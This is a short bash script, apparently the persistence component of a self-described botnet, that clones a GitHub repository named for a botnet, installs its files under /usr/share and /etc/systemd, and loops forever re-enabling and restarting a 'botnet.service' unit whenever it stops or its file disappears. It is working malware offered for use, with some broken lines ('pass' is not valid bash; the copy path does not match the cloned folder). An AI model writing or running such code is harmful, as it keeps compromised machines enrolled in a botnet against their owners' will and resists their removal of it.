#Har har Mahadev
#!/bin/bash




# Folder check
folder="/usr/share/Bnet"

while true; do
    if [ ! -d "$folder" ]; then
        #this and else statment done same job i know .. just for bee in safe side .. ( to much thinking ;)
        git clone https://github.com/Dhanraj369/Spider_shell_reshell_botnet.git
        cp -r the_spider_shell_reshell/Debian_based_botne/Bnet /usr/share/ 
        cp /usr/share/Bnet/botnet.service /etc/systemd/system/
        systemctl enable botnet.service
        systemctl start botnet.service 
        systemctl daemon-reload
    fi

    service_name="botnet.service"

    if systemctl is-active --quiet $service_name; then

        pass

    else
        systemctl enable $service_name
        systemctl restart $service_name
        systemctl daemon-reload

    fi


    sleep 5 

    
    service_name="botnet.service"

    service_file="/etc/systemd/system/botnet.service"
 
    copy_command="cp /usr/share/Bnet/botnet.service /etc/systemd/system/"
    
    reload_command="systemctl daemon-reload"

    enable_command="systemctl enable botnet.service"

    start_command="systemctl start botnet.service"
    
  
    if [ ! -f "$service_file" ]; then
     
        $copy_command
        $reload_command
        $enable_command
        $start_command
        
        
    else
        echo "abeee [else] kya dekh raha he if vala him kaam karega conform"
    fi


    sleep 5  
done

